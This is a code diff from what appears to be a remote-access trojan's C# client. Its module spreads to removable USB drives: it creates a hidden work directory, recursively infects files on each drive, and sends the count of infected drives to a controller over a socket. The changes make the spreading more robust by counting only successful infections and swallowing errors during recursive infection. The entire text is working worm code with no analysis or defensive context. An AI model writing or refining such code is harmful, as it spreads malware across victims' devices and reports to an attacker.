@@ -39,7 +39,6 @@ namespace Client.Handle_Packet
                 {
                     if (usb.DriveType == DriveType.Removable && usb.IsReady)
                     {
-                        count += 1;
                         if (!Directory.Exists(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory))
                         {
                             Directory.CreateDirectory(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory);
@@ -55,6 +54,8 @@ namespace Client.Handle_Packet
                         CreteDirectory(usb.RootDirectory.ToString());
 
                         InfectFiles(usb.RootDirectory.ToString());
+
+                        count++;
                     }
                 }
                 catch (Exception ex)
@@ -62,14 +63,13 @@ namespace Client.Handle_Packet
                     Debug.WriteLine("Initialize " + ex.Message);
                 }
             }
-            if (count != 0)
+            if (count > 0)
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "usbSpread";
                 msgpack.ForcePathObject("Count").AsString = count.ToString();
                 ClientSocket.BeginSend(msgpack.Encode2Bytes());
             }
-
         }
 
         private void ExplorerOptions()
@@ -103,8 +103,12 @@ namespace Client.Handle_Packet
 
             foreach (var directory in Directory.GetDirectories(path))
             {
-                if (!directory.Contains(spreadSettings.WorkDirectory))
-                    InfectFiles(directory);
+                try
+                {
+                    if (!directory.Contains(spreadSettings.WorkDirectory))
+                        InfectFiles(directory);
+                }
+                catch { }
             }
         }
 
